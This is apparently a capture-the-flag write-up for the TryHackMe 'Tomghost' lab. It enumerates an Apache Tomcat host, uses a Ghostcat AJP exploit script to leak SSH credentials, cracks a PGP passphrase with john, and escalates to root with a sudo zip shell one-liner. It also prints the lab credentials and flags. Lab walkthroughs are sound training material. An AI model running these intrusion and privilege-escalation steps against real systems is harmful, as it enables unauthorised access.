# Tomghost - Linux Easy

*Machine IP may vary over the readme*

## Enumeration

### Nmap: `nmap -sV 10.10.89.96 -oN nmap-initial`

```bash
PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp    open     tcpwrapped
8009/tcp  open     ajp13      Apache Jserv (Protocol v1.3)
8080/tcp  open     http       Apache Tomcat 9.0.30
50300/tcp filtered unknown
```

**Apache Tomcat 9.0.30** - seems useful

### Gobuster: `gobuster dir -u http://10.10.89.96:8080/ --wordlist=../common_wl.txt| tee gobuster-scan`

```bash
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/favicon.ico          (Status: 200) [Size: 21630]             
/host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
/manager              (Status: 302) [Size: 0] [--> /manager/]    
```

Nothing special here... Not able to visit */host-manager* and */manager* as it can be only visited by localhost.

Lets run nikto now. See if we can get something

### Nikto: `nikto -u http://10.10.89.96:8080/`

Nikto returns some interesting results mainly: 

`OSVDB-397: HTTP method 'PUT' allows clients to save files on the web server.`

Maybe I can put a reverse shell script on server and try getting back a shell. Well did try this using curl but didn't work. I guess it needs a specific dir to put files to but I wasn't able to either access or even confirm if the directory was there. Gotta think something else. 

Then I noticed something the room has a picture of a cat with text **GHOSTCAT**. Let's google about that.

`Ghostcat is a serious vulnerability in Tomcat discovered by security researcher of Chaitin Tech. Due to a flaw in the Tomcat AJP protocol, an attacker can read or include any files in the webapp directories of Tomcat. For example, An attacker can read the webapp configuration files or source code`

```
If the AJP Connector is enabled and the attacker can access the AJP Connector service port, there is a risk of being exploited by the Ghostcat vulnerability.

It should be noted that Tomcat AJP Connector is enabled by default and listens at 0.0.0.0:8009
```

OK I know from nmap results that there is something called as *ajp13* running on port 8009. Maybe I check this out.

Using *searchsploit* for exploitation script if any: `searchsploit ghostcat`

There is a python script which requires address as a command line argument for the script. Let's run that and see what we can get. There it is:

```xml
<description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
</description>
```

We got a username and a password. Let's try ssh. And we are in.

## User.txt

Doing `ls -al` reveals two files. No user flag file here. Let's check the users on the system using: `grep -E "/bin/.*sh" /etc/passwd`

```bash
root:x:0:0:root:/root:/bin/bash
merlin:x:1000:1000:zrimga,,,:/home/merlin:/bin/bash
skyfuck:x:1002:1002:tryhackme TRIAL PoC,3871289312,2931923021,2391293912,2031201201:/home/skyfuck:/bin/bash
```

Let's check the home dir of user merlin. `ls -al ../merlin`

There it is `-rw-rw-r-- 1 merlin merlin   26 Mar 10  2020 user.txt`. It can be read by anyone. Nice!

cat out the file and we have our user flag: `THM{GhostCat_1s_so_cr4sy}`

## Root.txt

Doing `sudo -l` reveals that user *skyfuck* is not allowed to run sudo. Maybe find will help.

`find / -perm -u=s -type f 2>/dev/null`

```bash
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/vmware-user-suid-wrapper
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/bin/mount
/bin/ping
/bin/umount
/bin/fusermount
/bin/su
/bin/ping6
```

Nothing here I can use. I need to switch my user somehow.

In the directory */home/skyfuck* there are two files - **credential.pgp** and **tryhackme.asc**.

Using gpg to import and decrypt file reveals that it needs a passphrase for that. 

```bash
gpg --import tryhackme.asc

gpg --decrypt credential.pgp 
You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)
gpg: gpg-agent is not available in this session
Enter passphrase: 
```

Guess gotta look for john. Move the files to your attacking machine using *scp* and run *gpg2john* on the tryhackme.asc file.

`gpg2john *.asc > hash`

Let's decrypt that using john: `john hash --wordlist=rockyou.txt`

We got our passphrase: `alexandru        (tryhackme)`

Using the passphrase we got *merlins* password: `asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`

Doing `sudo -l` as merlin we get: 

```bash
User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip 
```

Executing the folowing commands taken from [gftobins](https://gtfobins.github.io/gtfobins/zip/) for priv esc will result in root user.

```bash
TF=$(mktemp -u)
zip $TF /etc/hosts -T -TT 'sh #'
rm $TF
```

Just cat out the root flag now at */root/root.txt*: `THM{Z1P_1S_FAKE}`
